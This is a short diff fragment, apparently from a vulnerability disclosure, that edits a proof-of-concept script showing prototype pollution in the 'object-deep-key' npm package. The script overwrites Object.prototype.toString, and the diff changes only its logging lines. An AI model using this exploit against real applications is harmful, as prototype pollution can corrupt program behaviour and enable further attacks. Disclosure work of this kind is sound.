@@ -9,9 +9,9 @@
 // poc.js
 const objDeepKey = require('object-deep-key').default
 
-console.log(`Before: ${{}.toString}`)
+console.log('Before: ', {}.toString)
 objDeepKey(constructor.prototype, 'toString').set('function prototype polluted')
-console.log(`After: ${{}.toString}`)
+console.log('After: ', {}.toString)
 ```
 2. Execute the following commands in the terminal:
 ```bash
